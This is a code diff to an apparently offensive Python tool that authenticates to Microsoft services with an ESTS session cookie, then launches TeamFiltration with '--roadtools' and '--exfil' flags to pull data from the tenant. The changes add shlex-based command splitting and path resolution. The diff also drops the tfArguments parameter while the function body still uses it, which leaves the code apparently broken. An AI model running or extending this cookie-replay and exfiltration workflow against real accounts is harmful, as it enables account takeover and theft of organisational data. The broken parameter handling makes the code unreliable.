@@ -1,3 +1,4 @@
+import shlex
 import subprocess
 import os
 import argparse
@@ -157,7 +158,7 @@ def download_remote_file(ssh, remote_file, local_file):
     except Exception as e:
         print(f"{ERROR_ICON} Failed to download file: {e}")
 
-def execute_authentication(estscookie, username, resourceUri, clientId, redirectUrl, geckoDriverPath, teamFiltrationPath, keepOpen, tfArguments=None):
+def execute_authentication(estscookie, username, resourceUri, clientId, redirectUrl, geckoDriverPath, teamFiltrationPath, keepOpen):
     # Attempt to execute the authentication process
     try:
         # Informing the user about the start of the process
@@ -213,9 +214,18 @@ def execute_authentication(estscookie, username, resourceUri, clientId, redirect
         # Additional functionality to use TeamFiltration if present
         # Build the command line for TeamFiltration if arguments are provided
         if tfArguments:
-            commandLine = f"{teamFiltrationPath} --outpath {safeUserName} --roadtools {outfilePath} --exfil"
+            #Get the full path to the binary, needed for linux(?)
+            teamFiltrationPath = os.path.join(os.getcwd(), teamFiltrationPath)
+            
+            #Build the command line
+            commandLine = f"{teamFiltrationPath} --outpath {safeUserName} --roadtools {outfilePath} --exfil "
             commandLine += " ".join(tfArguments)
+
             print(f"{INFO_ICON} Executing: {commandLine}")
+
+            #split the command line into a list
+            commandLine = shlex.split(commandLine)
+
             # Execute the TeamFiltration command
             process = subprocess.Popen(commandLine,  stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             
@@ -231,7 +241,7 @@ def execute_authentication(estscookie, username, resourceUri, clientId, redirect
 
     # Catch any exception that was not explicitly handled above
     except Exception as e:
-        print(ERROR_ICON + f"Error using RoadTools: {e}")
+        print(ERROR_ICON + f"Error: {e}")
         return
 
 def process_combinations(valid_json_objects, processed_combinations):
